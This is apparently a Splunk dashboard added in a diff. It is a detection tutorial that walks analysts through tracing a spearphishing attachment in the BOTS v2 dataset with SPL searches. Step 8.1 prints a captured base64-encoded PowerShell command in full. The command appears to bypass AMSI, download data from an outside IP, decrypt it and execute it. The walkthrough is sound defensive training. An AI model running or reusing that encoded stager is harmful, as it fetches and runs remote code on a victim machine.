@@ -1,0 +1,347 @@
+<dashboard>
+  <label>Darkhotel - Spearphishing Attachment</label>
+  <description>Looking at the 'Spearphishing Attachment' attack which is referenced in MITRE ATT&amp;CK as a technique used by the APT - Darkhotel.</description>
+  <row>
+    <panel>
+      <title>Introduction</title>
+      <html tokens="true">
+      <h1>
+          <b>Introduction</b>
+      </h1>
+      <h2>
+          <b>What is Spearphishing?</b>
+      </h2>
+      <p>Spear-phishing is a targeted attempt to obtain confidential information under the guise of an authentic sounding email which aims to get the user to download an attachment and have them execute it on their machine so the attacker can take further action</p>
+      <h2>
+          <b>What is the aim of this dashboard?</b>
+      </h2>
+      <p>The purpose of this dashboard is to guide you through the detection of the technique Spearphishing Attachment (T1193) which has been frequently used by most APTs, in particular Darkhotel. The dashboard uses BotSv2 as a basis for the searches as this dataset
+        contains a scenario in which a competitor to a business performs a spearphishing attack to gain control of their opponents systems and learn more about their business processes.</p>
+    </html>
+    </panel>
+  </row>
+  <row>
+    <panel>
+      <title>Step 1.1: Discovering Emails</title>
+      <html tokens="true">
+      <h1>
+          <b>Step 1.1: Discovering Emails</b>
+      </h1>
+      <p>The first step we need to take is analyse the data we have. The first place to look would be under the sourcetype 'stream:smtp' as this holds data pertaining to emails which have been sent:</p>
+      <pre>index=botsv2 sourcetype=stream:smtp</pre>
+      <p>On the right you can see a table of every email found under the SMTP sourcetype. It's always good to get an idea of what your data is before you delve into any searches.</p>
+      <p>Some interesting fields include:</p>
+      <ul>
+          <li><p>content</p></li>
+          <li><p>sender</p></li>
+          <li><p>recipient</p></li>
+          <li><p>subject</p></li>
+          <li><p>attach_content_decoded_md5_hash</p></li>
+          <li><p>src_ip</p></li>
+          <li><p>dest_ip</p></li>
+          <li><p>timestamp</p></li>
+          <li><p>attach_filename</p></li>
+      </ul>
+    </html>
+    </panel>
+    <panel>
+      <title>Step 1.2: Discovering Emails</title>
+      <event>
+        <title>Emails</title>
+        <search>
+          <query>index=botsv2 sourcetype=stream:smtp</query>
+          <earliest>0</earliest>
+          <latest></latest>
+          <sampleRatio>1</sampleRatio>
+        </search>
+        <option name="count">1</option>
+        <option name="list.drilldown">none</option>
+        <option name="list.wrap">1</option>
+        <option name="maxLines">5</option>
+        <option name="raw.drilldown">full</option>
+        <option name="refresh.display">progressbar</option>
+        <option name="rowNumbers">0</option>
+        <option name="table.drilldown">all</option>
+        <option name="table.sortDirection">asc</option>
+        <option name="table.wrap">1</option>
+        <option name="type">list</option>
+      </event>
+    </panel>
+  </row>
+  <row>
+    <panel>
+      <title>Step 2.1: Discovering Attached Files</title>
+      <html tokens="true">
+      <h1>
+          <b>Step 2.1: Discovering Attached Files</b>
+      </h1>
+      <p>The following search provides us with information on simply just the attachments that have been sent/received:
+      <pre>index=botsv2 sourcetype=stream:smtp | stats count by attach_filename{}</pre>
+      </p>
+      <p>It's worth noting that both "Malware Alert Text.txt" and "invoice.zip" share the same number of occurences, possibly suggesting that the alerts are being raised each time the invoice file is found.</p>
+    </html>
+    </panel>
+    <panel>
+      <title>Step 2.2: Discovering Attached Files</title>
+      <chart>
+        <title>Attached Files</title>
+        <search>
+          <query>index=botsv2 sourcetype=stream:smtp | stats count by attach_filename{}</query>
+          <earliest>0</earliest>
+          <latest></latest>
+          <sampleRatio>1</sampleRatio>
+        </search>
+        <option name="charting.chart">bar</option>
+        <option name="charting.drilldown">none</option>
+      </chart>
+    </panel>
+  </row>
+  <row>
+    <panel>
+      <title>Step 3.1: Analysing the Malicious Alert</title>
+      <html tokens="true">
+      <h1>
+          <b>Step 3.1: Analysing the Malicious Alert</b>
+      </h1>
+      <p>To find out more about what caused the malicious alert we can view the content found in the email containing the malicious file with the following search:
+      <pre>index=botsv2 sourcetype=stream:smtp attach_filename{}="Malware Alert Text.txt" | table content{}</pre>
+      </p>
+      <p>This search allows as to isolate some interesting data. For example we can scroll to the bottom to find that the alert has been encoded in Base64. This might tell us more about what file we need to really be looking at.</p>
+      <p>CyberChef is a tool written by GCHQ which can allow us to decode the alert:</p>
+      <ul>
+        <li>
+          <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>
+        </li>
+      </ul>
+      <p>The data we need to decode is:</p>
+      <pre>TWFsd2FyZSB3YXMgZGV0ZWN0ZWQgaW4gb25lIG9yIG1vcmUgYXR0YWNobWVudHMgaW5jbHVkZWQg
+d2l0aCB0aGlzIGVtYWlsIG1lc3NhZ2UuIA0KQWN0aW9uOiBBbGwgYXR0YWNobWVudHMgaGF2ZSBi
+ZWVuIHJlbW92ZWQuDQppbnZvaWNlLmRvYwkgVHJvamFuLlpWRUotMg0KaW52b2ljZS5kb2MJIE85
+N00vRG9ub2ZmIXJmbg0K</pre>
+      <p>The CyberChef output should show:</p>
+      <pre>Malware was detected in one or more attachments included with this email message.
+Action: All attachments have been removed.
+invoice.doc	 Trojan.ZVEJ-2
+invoice.doc	 O97M/Donoff!rfn</pre>
+      <p>This is clearly a malicious file as it is labeled as a Trojan.</p>
+    </html>
+    </panel>
+    <panel>
+      <title>Step 3.2: Analysing the Malicious Alert</title>
+      <table>
+        <title>Alert Data</title>
+        <search>
+          <query>index=botsv2 sourcetype=stream:smtp attach_filename{}="Malware Alert Text.txt" | table content{}</query>
+          <earliest>0</earliest>
+          <latest></latest>
+        </search>
+        <option name="count">1</option>
+        <option name="drilldown">none</option>
+      </table>
+    </panel>
+  </row>
+  <row>
+    <panel>
+      <title>Step 4.1: Analysing the Bad File</title>
+      <html tokens="true">
+      <h1>
+          <b>Step 4.1: Analysing the Bad File</b>
+      </h1>
+      <p>To find out more about what caused the malicious alert we can view the content found in the email containing the malicious file with the following search:
+      <pre>index=botsv2 sourcetype=stream:smtp attach_filename{}="invoice.zip" | table _time, src_ip, sender, dest_ip, recipient, attach_filename{}, attach_content_decoded_md5_hash{}</pre>
+      </p>
+      <p>Once again we can use OSINT tools to discover more information on the file and the associated metadata:</p>
+      <h2>
+          <b>VirusTotal</b>
+      </h2>
+      <p>We can use VirusTotal to analyse the MD5 hash of the file and find out if it has been seen elsewhere and if so what it's rating could be:</p>
+      <ul>
+        <li>
+          <a href="https://www.virustotal.com/" target="_blank">VirusTotal</a>
+        </li>
+      </ul>
+      <h2>
+          <b>WhoIs</b>
+      </h2>
+      <p>This tool can give us more information on the source IP of the email which may lead to identifying the real sender. Try searching for the 'senderIP' using the following tool:</p>
+      <ul>
+        <li>
+          <a href="http://whois.domaintools.com/" target="_blank">WhoIs</a>
+        </li>
+      </ul>
+    </html>
+    </panel>
+    <panel>
+      <title>Step 4.2: Analysing the Bad File</title>
+      <table>
+        <title>Bad File</title>
+        <search>
+          <query>index=botsv2 sourcetype=stream:smtp attach_filename{}="invoice.zip" | rex field=content{} "sender IP is (?&lt;senderIP&gt;\d+\.\d+\.\d+\.\d+)" | table _time, src_ip, senderIP, sender, dest_ip, recipient, attach_filename{}, attach_content_decoded_md5_hash{}</query>
+          <earliest>0</earliest>
+          <latest></latest>
+        </search>
+        <option name="count">10</option>
+        <option name="drilldown">none</option>
+        <option name="refresh.display">progressbar</option>
+      </table>
+    </panel>
+  </row>
+  <row>
+    <panel>
+      <title>Step 5.1: Detecting the Other Malicious Activity</title>
+      <html tokens="true">
+      <h1>
+          <b>Step 5.1: Detecting the Other Malicious Activity</b>
+      </h1>
+      <p>To find out if the document was successfully opened and if it caused any extra damage, we can search for the filename across all sourcetypes excluding stream:smtp:
+      <pre>index=botsv2 sourcetype!=stream:smtp invoice.zip | stats count by sourcetype</pre>
+      </p>
+      <p>Sysmon is likely going to be an interesting sourcetype to look at as it contains a lot of data and seems to have the most discoveries of the file.</p>
+    </html>
+    </panel>
+    <panel>
+      <title>Step 5.2: Detecting the Other Malicious Activity</title>
+      <chart>
+        <title>References in Other Sourcetypes</title>
+        <search>
+          <query>index=botsv2 sourcetype!=stream:smtp invoice.zip | stats count by sourcetype</query>
+          <earliest>0</earliest>
+          <latest></latest>
+        </search>
+        <option name="charting.chart">column</option>
+        <option name="charting.drilldown">none</option>
+      </chart>
+    </panel>
+  </row>
+  <row>
+    <panel>
+      <title>Step 6.1: Determining When the File was Opened</title>
+      <html tokens="true">
+      <h1>
+          <b>Step 6.1: Determining When the File was Opened</b>
+      </h1>
+      <p>Let's select sysmon as our sourcetype and discover where invoice.doc was referenced with the following search:
+      <pre>index=botsv2 host=wrk-btun sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" Name EventID=1 process="\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\billy.tun\\AppData\\Local\\Temp\\Temp1_invoice.zip\\invoice.doc\" /o \"u\"" | table EventID, process, app, _time</pre>
+      </p>
+    </html>
+    </panel>
+    <panel>
+      <title>Step 6.2: Determining When the File was Opened</title>
+      <table>
+        <search>
+          <query>index=botsv2 host=wrk-btun sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" Name EventID=1 process="\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\billy.tun\\AppData\\Local\\Temp\\Temp1_invoice.zip\\invoice.doc\" /o \"u\"" | table EventID, process, app, _time</query>
+          <earliest>0</earliest>
+          <latest></latest>
+        </search>
+        <option name="drilldown">none</option>
+      </table>
+    </panel>
+  </row>
+  <row>
+    <panel>
+      <title>Step 7.1: Identifying Suspicious Processes</title>
+      <html tokens="true">
+      <h1>
+          <b>Step 7.1: Identifying Suspicious Processes</b>
+      </h1>
+      <p>Now we know when the file was opened and who it was opened by we can do a search using a time range within 2 minutes of the event to discover any strange processes which may have been created (see EventID=1):
+      <pre>index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" host=wrk-btun EventID=1 | chart count by ParentImage</pre>
+      </p>
+    </html>
+    </panel>
+    <panel>
+      <title>Step 7.2: Identifying Suspicious Processes</title>
+      <chart>
+        <title>Processes</title>
+        <search>
+          <query>index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" host=wrk-btun EventID=1 | chart count by ParentImage</query>
+          <earliest>1503545335</earliest>
+          <latest>1503545700</latest>
+          <sampleRatio>1</sampleRatio>
+        </search>
+        <option name="charting.axisLabelsX.majorLabelStyle.overflowMode">ellipsisNone</option>
+        <option name="charting.axisLabelsX.majorLabelStyle.rotation">0</option>
+        <option name="charting.axisTitleX.visibility">visible</option>
+        <option name="charting.axisTitleY.visibility">visible</option>
+        <option name="charting.axisTitleY2.visibility">visible</option>
+        <option name="charting.axisX.abbreviation">none</option>
+        <option name="charting.axisX.scale">linear</option>
+        <option name="charting.axisY.abbreviation">none</option>
+        <option name="charting.axisY.scale">linear</option>
+        <option name="charting.axisY2.abbreviation">none</option>
+        <option name="charting.axisY2.enabled">0</option>
+        <option name="charting.axisY2.scale">inherit</option>
+        <option name="charting.chart">pie</option>
+        <option name="charting.chart.bubbleMaximumSize">50</option>
+        <option name="charting.chart.bubbleMinimumSize">10</option>
+        <option name="charting.chart.bubbleSizeBy">area</option>
+        <option name="charting.chart.nullValueMode">gaps</option>
+        <option name="charting.chart.showDataLabels">none</option>
+        <option name="charting.chart.sliceCollapsingThreshold">0.01</option>
+        <option name="charting.chart.stackMode">default</option>
+        <option name="charting.chart.style">shiny</option>
+        <option name="charting.drilldown">none</option>
+        <option name="charting.layout.splitSeries">0</option>
+        <option name="charting.layout.splitSeries.allowIndependentYRanges">0</option>
+        <option name="charting.legend.labelStyle.overflowMode">ellipsisMiddle</option>
+        <option name="charting.legend.mode">standard</option>
+        <option name="charting.legend.placement">right</option>
+        <option name="charting.lineWidth">2</option>
+        <option name="trellis.enabled">0</option>
+        <option name="trellis.scales.shared">1</option>
+        <option name="trellis.size">medium</option>
+      </chart>
+    </panel>
+  </row>
+  <row>
+    <panel>
+      <title>Step 8.1: Isolating the Process</title>
+      <html tokens="true">
+      <h1>
+          <b>Step 8.1: Isolating the Process</b>
+      </h1>
+      <p>Shortly after the file was opened we can see a powershell execution under the process using wmiprvse.exe as a parent image. Let's look into the command thats executed with the following search:
+      <pre>index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" host=wrk-btun EventID=1 | reverse  | search ParentImage="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" | table ParentImage, Image, CommandLine</pre>
+      </p>
+      <pre>powershell -noP -sta -w 1 -enc  WwBSAEUARgBdAC4AQQBTAFMARQBtAGIAbABZAC4ARwBlAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBMAHUAZQAoACQAbgB1AEwAbAAsACQAVAByAHUARQApAH0AOwBbAFMAWQBzAFQARQBNAC4ATgBlAHQALgBTAGUAcgBWAEkAYwBFAFAATwBpAG4AVABNAEEAbgBBAEcARQByAF0AOgA6AEUAWABQAEUAYwBUADEAMAAwAEMATwBOAHQAaQBuAHUAZQA9ADAAOwAkAHcAQwA9AE4ARQB3AC0ATwBCAGoARQBDAFQAIABTAHkAcwBUAGUAbQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAVwBjAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUABSAE8AWAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4ARQB0AC4AVwBFAEIAUgBlAHEAdQBlAFMAVABdADoAOgBEAGUAZgBBAFUAbAB0AFcAZQBiAFAAcgBPAHgAeQA7ACQAVwBDAC4AUABSAG8AeAB5AC4AQwBSAEUARABlAE4AdABJAEEAbABzACAAPQAgAFsAUwB5AFMAdABlAE0ALgBOAEUAVAAuAEMAUgBlAGQARQBOAHQAaQBBAGwAQwBBAEMAaABFAF0AOgA6AEQAZQBGAEEAdQBsAFQATgBFAFQAVwBvAFIAawBDAHIAZQBEAEUATgBUAEkAYQBsAFMAOwAkAEsAPQBbAFMAeQBzAFQAZQBtAC4AVABFAHgAdAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAVABlAHMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAFcAQwAuAEgAZQBhAEQAZQBSAFMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGoAawBuAFgAcABvAGEANwBwAFUAQQAwAGwARABCACsAbgBZAGkAUQB2AFUAOQB1AG4ASABnAD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARABBAFQAQQA9ACQAVwBDAC4ARABvAFcAbgBMAG8AQQBkAEQAYQBUAGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAVgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAYQA9ACQARABhAFQAQQBbADQALgAuACQAZABhAFQAYQAuAEwAZQBOAEcAdABIAF0AOwAtAGoAbwBpAE4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA</pre>
+      <p>The '-enc' flag suggests it has been encoded (possibly to hide the activity) so we need to decode it. Once again we can use CyberChef to decode this event as it contains Base64 encoded Powershell commands (You will just need the part after -enc)</p>
+      <ul>
+        <li>
+          <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>
+        </li>
+      </ul>
+      <p>You'll see that it returns some suspicious looking commands being run which might suggest the activity of a Trojan as was suggested earlier by the Malware Alert.</p>
+    </html>
+    </panel>
+    <panel>
+      <title>Step 8.2: Isolating the Process</title>
+      <table>
+        <title>Powershell Execution</title>
+        <search>
+          <query>index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" host=wrk-btun EventID=1 | reverse  | search ParentImage="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" | table ParentImage, Image, CommandLine</query>
+          <earliest>1503545335</earliest>
+          <latest>1503545400</latest>
+          <sampleRatio>1</sampleRatio>
+        </search>
+        <option name="count">20</option>
+        <option name="dataOverlayMode">none</option>
+        <option name="drilldown">none</option>
+        <option name="percentagesRow">false</option>
+        <option name="rowNumbers">false</option>
+        <option name="totalsRow">false</option>
+        <option name="wrap">true</option>
+      </table>
+    </panel>
+  </row>
+ <row>
+    <panel>
+      <title>Conclusion</title>
+      <html tokens="true">
+      <h1>
+          <b>Conclusion</b>
+      </h1>
+      <p>There we have it! We have successfully discovered a malicious file which was sent over email and traced it's movement directly to the powershell commands which were executed. Online resources are key when doing this research as they can tell you what you need to be looking at and if the information has been seen in the wild before (e.g. hashes, IPs). Information such as Event IDs and different process names can seem overwhelming at first but are crucial to your detection of attacks.</p>
+    </html>
+    </panel>
+  </row>
+</dashboard>
